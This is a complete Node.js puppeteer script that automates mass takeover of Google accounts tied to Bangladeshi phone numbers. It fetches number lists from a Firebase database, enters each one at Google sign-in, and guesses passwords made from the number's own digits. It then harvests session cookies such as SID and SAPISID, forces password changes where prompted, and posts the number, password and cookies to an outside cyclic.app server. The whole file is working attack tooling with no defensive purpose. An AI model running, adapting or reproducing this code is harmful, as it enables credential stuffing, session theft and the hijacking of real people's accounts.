require('events').EventEmitter.prototype._maxListeners = 100
const puppeteer = require('puppeteer')
const crypto = require('crypto')
const axios = require('axios')
const fs = require('fs')


const COUNTRY = 'BD'
const SAVE_SIZE = 10


let signIn = 'https://accounts.google.com/v3/signin/identifier?dsh=S940062189%3A1665260575698599&continue=https%3A%2F%2Faccounts.google.com%2F&followup=https%3A%2F%2Faccounts.google.com%2F&passive=1209600&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AQDHYWp7Xws8OWDo__8vSPkkEImpDwna2RbBmEUp7Wfl7GpYaoWHAtWPfHfSSX-zonF0xYJnZ7HWlw&hl=en-US'

let FOUND = 'https://database088-default-rtdb.firebaseio.com/raiyan088/code/found/'
let GMAIL = 'https://database088-default-rtdb.firebaseio.com/raiyan088/code/gmail/'
let TOKEN = 'https://database088-default-rtdb.firebaseio.com/raiyan088/code/token/'

let SERVER = null
let SIZE = 0
let mList = []
let mCaptcha = false
let mReject = 0
let mCaptchaList = {}

let mTime = 0

let page = null


fs.readFile('id.txt', { encoding: 'utf-8' }, function(err,data){
    if(!err) {
        try {
            process.argv.slice(2).forEach(function (val, index) {
                if (index == 0) {
                    SERVER = 'server-'+data+'/child-'+val
                    if (mList.length == 0) {
                        phoneNumber(false)
                    }
                }
            })
        } catch (e) {}
    }
})

try {
    mCaptchaList = JSON.parse(fs.readFileSync('captcha.json'))
} catch (error) {}

fs.watchFile('captcha.json', function(curr, prev) {
    try {
        mCaptchaList = JSON.parse(fs.readFileSync('captcha.json'))
    } catch (error) {}
})


function phoneNumber(update) {
    mList = []

    if (update) {
        dataCollect(true)
    } else {
        axios.get(TOKEN+SERVER+'.json').then(res => {
            try {
                let data = res.data.list
                SIZE = res.data.size

                if (SIZE >= 1000) {
                    dataCollect(false)
                } else if(data != null && SIZE != null) {
                    mList = data
                }
            } catch (error) {}
    
            if (mList == null) {
                mList = []
            }
    
            dataCollect(false)
        }).catch(err => {})
    }
}

function dataCollect(update) {
    
    if (mList.length == 0) {
        axios.get(FOUND+'server.json').then(res => {
            try {
                if (res.data.size >= 1000) {
                    let CHECK = res.data.server
                    let S_SIZE = res.data.size
                    let COLLECT = res.data.collect
                    
                    axios.get(FOUND+'number.json?orderBy="$key"&limitToFirst=1').then(res => {
                        let key = null
                        try {
                            let data = res.data
                            if(data) {
                                for (let [keys, values] of Object.entries(data)) {
                                    key = keys
                                    for (let value of Object.values(values)) {
                                        mList.push(value)
                                    }
                                }
                            }
                        } catch (error) {}
        
                        if (key && mList.length >= 1000) {
                            if (CHECK == false) {
                                setData(FOUND+'server/size.json', S_SIZE - 1000)
                            } else {
                                setData(FOUND+'server/collect.json', COLLECT + 1000)
                            }

                            SIZE = 0
                            
                            setData(TOKEN+SERVER+'.json', { size: SIZE, list: mList })
                            deleteData(FOUND+'number/'+key+'.json')

                            if (update) {
                                setTimeout( async () => {
                                    await page.goto(signIn)
                                    await page.evaluate((gmail) => document.querySelector('input#identifierId').value = gmail, '+'+mList[SIZE])
                                    await page.evaluate(() => document.querySelector('#identifierNext').click())        
                                }, 100)
                            } else {
                                browserStart()
                            }
                        } else {
                            setTimeout(() => {
                                dataCollect(update)
                            }, 30000)
                        }
                    }).catch(err => {
                        setTimeout(() => {
                            dataCollect(update)
                        }, 30000)
                    })
                } else {
                    setTimeout(() => {
                        dataCollect(update)
                    }, 30000)
                }
            } catch (error) {
                setTimeout(() => {
                    dataCollect(update)
                }, 30000)
            }
        }).catch(err => {
            setTimeout(() => {
                dataCollect(update)
            }, 30000)
        })
    } else {
        if (update) {
            setTimeout( async () => {
                await page.goto(signIn)
                await page.evaluate((gmail) => document.querySelector('input#identifierId').value = gmail, '+'+mList[SIZE])
                await page.evaluate(() => document.querySelector('#identifierNext').click())        
            }, 100)
        } else {
            browserStart()
        }
    }
}

async function browserStart() {

    console.log('Browser Start', SIZE, mList.length, SERVER.split('/')[1])

    let browser = await puppeteer.launch({
        headless: true,
        args: [ '--no-sandbox', '--disable-setuid-sandbox' ]
    })

    page = await browser.newPage()

    await page.setUserAgent('Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36')

    page.on('request', async (req) => {
        let url = req.url

        mTime = new Date().getTime()

        if (url.startsWith('https://')) {
            if(url.includes('source-path=%2Fv3%2Fsignin%2Frejected')) {
                mReject++
                if (mReject >= 5) {
                    nextNumber(true, false)
                } else {
                    await page.goto(signIn)
                    await page.evaluate((gmail) => document.querySelector('input#identifierId').value = gmail, '+'+mList[SIZE])
                    await page.evaluate(() => document.querySelector('#identifierNext').click())    
                }
            } else if(url.startsWith('https://accounts.google.com/Captcha')) {
                if(!mCaptcha) {
                    mCaptcha = true
                    let send = mCaptchaList[new Date().getTime()]
                    if (send == null) {
                        send = 1
                    } else {
                        send += 1
                    }
                    mCaptchaList[new Date().getTime()] = send
                    console.log(Object.keys(mCaptchaList).length)
                    nextNumber(true, true)
                }
            } else if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=')) {
                if(url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe')) {
                    mCaptcha = false
                    setTimeout(async () => {
                        let error = await page.evaluate(() => {
                            let error = document.querySelector('div.o6cuMc')
                            if(error != null) {
                                return true
                            }
                            return false
                        })
    
                        if(error) {
                            nextNumber(true, false)
                        }
                    }, 2000)
                } else {
                    let pageUrl = await page.evaluate(() => window.location.href)
                    if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
                        let tl = null
                        let cid = 1
                        let index = pageUrl.indexOf('TL=')
                        if(index != -1) {
                            tl = pageUrl.substring(index+3, pageUrl.length).split('&')[0]
                            index = pageUrl.indexOf('cid=')
                            if(index != -1) {
                                cid = pageUrl.substring(index+4, pageUrl.length).split('&')[0]
                            }
                            let cookie = await page.cookies()
                            let gps = null
                            cookie.forEach(function (value) {
                                if (value.name == '__Host-GAPS') {
                                    gps = value.value
                                }
                            })
    
                            passwordMatching(mList[SIZE], tl, parseInt(cid), gps, 0)
                            if (SIZE < 999) {
                                await page.goto(signIn)
                            }
                        }
                    } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/')) {
                        nextNumber(true, false)
                    } else if(!pageUrl.startsWith('https://accounts.google.com/v3/signin/identifier')) {
                        console.log(pageUrl)
                    }
                }
            } else if (url.startsWith('https://accounts.google.com/signin/v2/challenge/recaptcha')) {
                let tl = null
                let index = url.indexOf('TL=')
                if(index != -1) {
                    tl = url.substring(index+3, url.length).split('&')[0]
                    let cookie = await page.cookies()
                    let gps = null
                    cookie.forEach(function (value) {
                        if (value.name == '__Host-GAPS') {
                            gps = value.value
                        }
                    })

                    recaptchaChallange(mList[SIZE], tl, gps)

                    if (SIZE < 999) {
                        await page.goto(signIn)
                    }
                }
            } else if (url.startsWith('https://accounts.google.com/signin/v2/challenge/selection')) {
                nextNumber(true, false)
            }
        }
    })

    await page.goto(signIn)
    await page.evaluate((gmail) => document.querySelector('input#identifierId').value = gmail, '+'+mList[SIZE])
    await page.evaluate(() => document.querySelector('#identifierNext').click())
}

setInterval(() => {
    if (mTime > 0 && mTime+120000 < new Date().getTime()) {
        //SIZE++
        saveData(true, false)
        setTimeout(() => {
            console.log('---Restart Browser---')
            process.exit(2)
        }, 1000)
    }
}, 30000)


function recaptchaChallange(number, tl, gps) {
    axios.post('https://accounts.google.com/_/signin/challenge?hl=en&TL='+tl, getRecaptchaData(tl), {
        headers: getGoogleHeader('__Host-GAPS='+gps)
    }).then(res => {
        let output = 0

        try {
            let body = res.data
            if (body.includes('FIRST_AUTH_FACTOR')) {
                let split = body.substring(body.indexOf('FIRST_AUTH_FACTOR'), body.length).split(',')
                let position = 0
                for (let i = 0; i < split.length; i++) {
                    if (split[i].includes('INITIALIZED')) {
                        position = i
                    }
                }
                if (position == 0) {
                    position = 1
                } else {
                    position -= 2
                }
                let cid = split[position].replace(' ', '')

                output = 1

                passwordMatching(number,tl, parseInt(cid), gps, 0)
            }
        } catch (e) {}

        try {
            if(output == 0) {
                nextNumber(false, false)
            }
        } catch (e) {}
    }).catch(err => {
        nextNumber(false, false)
    })
}

function passwordMatching(number, tl, cid, gps, loop) {

    let num = number.toString()
    let pass = num.substring(num.length-11, num.length)

    if(loop == 1) {
        pass = pass.substring(0, 8)
    } else if(loop == 2) {
        pass = pass.substring(pass.length-8, pass.length)
    }

    axios.post('https://accounts.google.com/_/signin/challenge?hl=en&TL='+tl, getPasswordData(pass, tl, cid), {
        headers: getGoogleHeader('__Host-GAPS='+gps)
    }).then(res => {
        let output = 0

        try {
            let body = res.data
            let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
            if(data[0][3] == 5) {
                if(loop == 0) {
                    output = 1
                    passwordMatching(number, tl, cid, gps, 1)
                } else if(loop == 1) {
                    output = 1
                    passwordMatching(number, tl, cid, gps, 2)
                }
            } else if(data[0][3] == 3) {
                if (body.includes('webapproval')) {
                    setData(GMAIL+'menually/'+COUNTRY+'/'+number+'.json', loop)
                } else {
                    setData(GMAIL+'voice/'+COUNTRY+'/'+number+'.json', loop)
                }
            } else if(data[0][3] == 1) {
                console.log('Login Success: '+SERVER.split('/')[1])

                setData(TOKEN+SERVER+'/size.json', SIZE)
                let cookiesList = res.headers['set-cookie']
                if(cookiesList) {
                    output = 1
                    let sendCookies = ''
    
                    for(let i=0; i<cookiesList.length; i++) {
                        let singelData = cookiesList[i]
                        try {
                            let start = singelData.indexOf('=')
                            let end = singelData.indexOf(';')
                            let key = singelData.substring(0, start)
                            if(key == 'SID' || key == '__Secure-1PSID' || key == 'HSID' || key == 'SSID' || key == 'SAPISID' || key == 'LSID' || key == 'APISID') {
                                let value = singelData.substring(start+1, end)
                                sendCookies += key+'='+value+'; '
                            }
                        } catch (e) {}
                    }

                    passwordChange(number, tl, cid, gps, pass, sendCookies, 0)
                }
            } else if(data[0][3] == 2) {

                output = 2

                try {
                    axios.post('https://accounts.google.com/_/speedbump/changepassword?hl=en&TL='+tl, getNewPasswordData(pass, tl), {
                        headers: getGoogleHeader('__Host-GAPS='+gps)
                    }).then(res => {
                        let output = 0
                        try {
                            let body = res.data
                            let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                            let cookiesList = res.headers['set-cookie']
                            if(data[0][1] == 3 && !body.includes('https://accounts.google.com/signin/v2/disabled/explanation') && cookiesList) {
                                let sendCookies = ''
                                output = 1
                                
                                for(let i=0; i<cookiesList.length; i++) {
                                    let singelData = cookiesList[i]
                                    try {
                                        let start = singelData.indexOf('=')
                                        let end = singelData.indexOf(';')
                                        let key = singelData.substring(0, start)
                                        if(key == 'SID' || key == '__Secure-1PSID' || key == 'HSID' || key == 'SSID' || key == 'SAPISID' || key == 'LSID' || key == 'APISID') {
                                            let value = singelData.substring(start+1, end)
                                            sendCookies += key+'='+value+'; '
                                        }
                                    } catch (e) {}
                                }
                                
                                passwordChange(number, tl, cid, gps, pass+'#', sendCookies, 0)
                            }
                        } catch (e) {}

                        try {
                            if(output == 0) {
                                nextNumber(false, false)
                            }
                        } catch (e) {}
                    }).catch(err => {
                        nextNumber(false, false)
                    })
                } catch (e) {
                    output = 0
                }
            }
        } catch (e) {}

        try {
            if(output == 0) {
                nextNumber(false, false)
            }
        } catch (e) {}
    }).catch(err => {
        nextNumber(false, false)
    })
}


function passwordChange(number, tl, cid, gps, password, cookies, again) {
    let data = COUNTRY+'★'+number+'★'+password+'★'+tl+'★'+gps+'★'+cid+'★'+cookies

    axios.post('https://worrisome-gold-suit.cyclic.app', { data: data }).then(res => {
        try {
            let body = res.data
            if (body['gmail'] != null && body['password'] != null && body['recovery'] != null && body['create'] != null) {
                nextNumber(false, false)
            } else if (again == 0) {
                passwordChange(number, tl, cid, gps, password, cookies, 1)
            } else {
                nextNumber(false, false)
            }
        } catch (error) {
            if (again == 0) {
                passwordChange(number, tl, cid, gps, password, cookies, 1)
            } else {
                nextNumber(false, false)
            }
        }
    }).catch(err => {
        if (again == 0) {
            passwordChange(number, tl, cid, gps, password, cookies, 1)
        } else {
            nextNumber(false, false)
        }
    })
}

function nextNumber(reload, captcha) {
    SIZE++
    saveData(false, captcha)
    mReject = 0
    if (SIZE >= 1000) {
        phoneNumber(true)
    } else {
        setTimeout(async () => {
            if (reload) {
                await page.goto(signIn)
            }
            await page.evaluate((gmail) => document.querySelector('input#identifierId').value = gmail, '+'+mList[SIZE])
            await page.evaluate(() => document.querySelector('#identifierNext').click())
        }, 100)
    }
}

function getPasswordData(password, tl, type) {
    return 'TL='+tl+'&continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&rip=1&service=accountsettings&f.req='+encodeURIComponent(JSON.stringify(['AEThLlw5uc06cH1q8zDfw1uY4Xp7eNORXHjsuJT-9-2nFsiykmQD7IcKUJPcYmG4KddhkjoTup4nzB0yrSZeYwm7We09VV6f-i34ApnWRsbGJ2V1tdbWPwWOgK4gDGSgJEJ2hIK9hyGgV-ejHBA-mCWDXqcePqHHag5bc4lHSHRGyNrOr9Biuyn6y8tk3iCBn5IY34f-QKm5-SOxrbYWDcto50q0oo2z0YCPFtY556fWL0DY0W0pAGKmW6Ky4ukssyF91aMhKyZsH5bzHEs0vPdnYAWfxipSCarZjBUB0TIR7W2MyATWD99NE0xXQAIy2AGgdxdyi9aYhS7sjH1iUhbjspK_di8Wn1us7BfEbjaXI0BA4SXy7igdq53U5lKmR1seyx6mpKnVKK59iCNyWzZOa8y91Q06DdD0OqQHaPmK2g6S2PH6j6CsOsBRGVxcvjnzysjfgf7bARU0CgFDOAwA8Q8fKOaqBIe0Xg3nfHILRWVBJnVqUpI',null,type,null,[1,null,null,null,[password,null,true]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",getIdentifier()]))+'&cookiesDisabled=false&deviceinfo='+encodeURIComponent(JSON.stringify([null,null,null,[],null,"",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,0,null,false,2,"",null,null,0]))+'&gmscoreversion=undefined&checkConnection=youtube%3A882%3A0&checkedDomains=youtube&pstMsg=1'
}

function getNewPasswordData(password, tl) {
    return 'TL='+tl+'&continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&rip=1&service=accountsettings&f.req='+encodeURIComponent('["gf.siecp","'+password+'#"]')+'&cookiesDisabled=false&deviceinfo='+encodeURIComponent(JSON.stringify([null,null,null,[],null,"",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,0,null,false,2,"",null,null,0]))+'&gmscoreversion=undefined&checkConnection=youtube%3A882%3A0&checkedDomains=youtube&pstMsg=1'
}

function getRecaptchaData(tl) {
    return 'TL='+tl+'&continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&rip=1&service=accountsettings&f.req='+encodeURIComponent('[null,null,1,2]')+'&cookiesDisabled=false&deviceinfo='+encodeURIComponent(JSON.stringify([null,null,null,[],null,"",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,0,null,false,2,"",null,null,0]))+'&gmscoreversion=undefined&checkConnection=youtube%3A882%3A0&checkedDomains=youtube&pstMsg=1'
}


function getIdentifier() {
    let data = ''
    let loop = Math.floor(Math.random() * 15)+15
    for(let i=0; i<loop; i++) {
        data = data+crypto.randomBytes(20).toString('hex')
    }
    return data
}

function saveData(instant, captcha) {
    if (captcha) {
        try {
            fs.writeFileSync('captcha.json', JSON.stringify(mCaptchaList))
        } catch (error) {}
    }
    if (instant || SIZE%SAVE_SIZE == 0) {
        console.log('Save Data: '+SERVER.split('/')[1], SIZE)
        setData(TOKEN+SERVER+'/size.json', SIZE)
    }
}

function setData(url, data) {
    axios.put(url, JSON.stringify(data), {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }).then(res => {}).catch(err => {})
}

function deleteData(url) {
    axios.delete(url).then(res => {}).catch(err => {})
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}

function getGoogleHeader(cookie) {
    return {
        'authority': 'myaccount.google.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'cookie': cookie,
        'google-accounts-xsrf' : 1,
        'origin': 'https://myaccount.google.com',
        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-full-version': '"112.0.5615.49"',
        'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.49", "Google Chrome";v="112.0.5615.49", "Not:A-Brand";v="99.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"15.0.0"',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
        'x-same-domain': '1',
    }
}
